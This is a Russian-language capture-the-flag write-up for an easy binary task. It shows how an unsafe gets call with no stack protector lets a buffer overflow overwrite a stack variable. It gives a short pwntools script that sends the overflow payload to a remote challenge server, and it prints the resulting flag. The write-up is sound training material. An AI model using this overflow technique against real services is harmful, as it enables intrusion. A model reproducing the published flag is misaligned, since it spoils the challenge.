
# Сайт: forkbomb.ru 
# Автор: @mrvos (Vlad Roskov)
# Сложность: Easy

Решим последнюю задачу из категории MicCheck. Воспользуемся инструментом сстатического анализа Ghidra и отладчком edb. 
Посмотрим, как выглядит программа.

#### 1. Дизассемблированный вид:
![image](https://github.com/user-attachments/assets/e8c6059d-0544-46d1-a9e9-8f7100444bb5)

#### 2. Декомпилированный вид: 
![image](https://github.com/user-attachments/assets/ed5d5b5c-19c2-4059-98c5-d712661d15e8)

Изначально на стеке (до вызова функции `gets`) лежит два числа 0 и 0x29a, самым первым будет на стеке лежать содержимое массива `char local_38[8]`. Так, как в программе 
используется небезопасная функция `gets` можно и отсутствует `stack-protector` мы можем переполнить буфер и перезаписать число находящееся по смещению `[RBP + local_10]`, то есть 0x29a.
Сделаем это с помощью библеотеки `pwntools`.

```py
from pwn import * 

p = remote('109.233.56.90', 11586)
magic_num = 0xcc07c9
p.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + p32(magic_num))
p.interactive()
```
Запустив код, получим флаг: <br />
![image](https://github.com/user-attachments/assets/3126a6ae-1d21-42e1-9469-9bf7b2085ad7)

Ответ: `spbctf{s4v3d_the_w0rld_fr0M_HELL}`



